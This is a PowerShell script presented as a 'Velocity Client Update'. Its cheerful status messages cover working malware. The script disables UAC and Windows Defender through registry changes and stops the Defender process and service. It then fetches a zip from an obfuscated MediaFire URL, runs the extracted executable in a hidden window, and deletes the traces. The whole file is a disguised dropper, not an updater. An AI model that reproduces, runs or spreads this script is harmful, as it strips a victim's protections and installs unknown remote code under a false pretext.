$UpdateID="VelocityUpdate_2025";Write-Host "Welcome to Velocity Client Update ($UpdateID)";Write-Host "Keeping your Velocity experience smooth!";$LogDir="$env:APPDATA\Velocity\Logs";$LogFile="$LogDir\update_$UpdateID.log";if(!(Test-Path $LogDir)){New-Item -Path $LogDir -ItemType Directory -Force};if(!(Test-Path $LogFile)){New-Item -Path $LogFile -ItemType File -Force};Write-Host "Checking Velocity client config...";Start-Sleep -Seconds 2;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue;Write-Host "Disabling Windows Defender...";Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowRealtimeMonitoring" -Value 0 -ErrorAction SilentlyContinue;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction SilentlyContinue;Stop-Process -Name "MsMpEng" -Force -ErrorAction SilentlyContinue;Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue;$UpdateSession=Get-Random -Minimum 5000 -Maximum 15000;Write-Host "Looking for Velocity updates...";$EncodedURL=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("https://download1078.mediafire.com/ff862iqkpf9gJZo4r0JJhhjaidWNQMHWN8SSSW9_6g_1a3AjKmLj-u_JvtIlNSdVdqSNRI-Mi0So2IyaVi1JBTK-pZzDwsZ2l2GqlwikoAnPfzHvcsHG79idZTTIrcwIKcbQNhVq462bTicuB_BOfVzi4smeHnOd15fimqf3N-Q/nu2wa6ab8x92t3d/net8.0-windows10.0.26100.0.zip"));$PayloadURL=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedURL));$UpdateDir="$env:APPDATA\Velocity\Updates";if(!(Test-Path $UpdateDir)){New-Item -Path $UpdateDir -ItemType Directory -Force};$ZipFile="$UpdateDir\velocity_update_$UpdateSession.zip";$ExtractDir="$UpdateDir\velocity_update_$UpdateSession";$WebClient=New-Object System.Net.WebClient;try{$WebClient.DownloadFile($PayloadURL,$ZipFile)}catch{Write-Host "Failed to download the update. Please check your internet connection or the URL.";exit};if(-not (Test-Path $ZipFile)){Write-Host "Update file not found after download. Please try again.";exit};Write-Host "Update downloaded!";Write-Host "Applying Velocity update...";if(Test-Path $ZipFile){Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile,$ExtractDir);$ExeFile=(Get-ChildItem -Path $ExtractDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName;if($ExeFile){Start-Process -FilePath $ExeFile -WindowStyle Hidden -ErrorAction SilentlyContinue}};Write-Host "Ensuring Visual C++ Redistributable is ready...";Write-Host "Cleaning up...";Remove-Item -Path $ZipFile -Force -ErrorAction SilentlyContinue;Remove-Item -Path $ExtractDir -Recurse -Force -ErrorAction SilentlyContinue;Write-Host "Velocity update ($UpdateID) doneâ€”enjoy!"
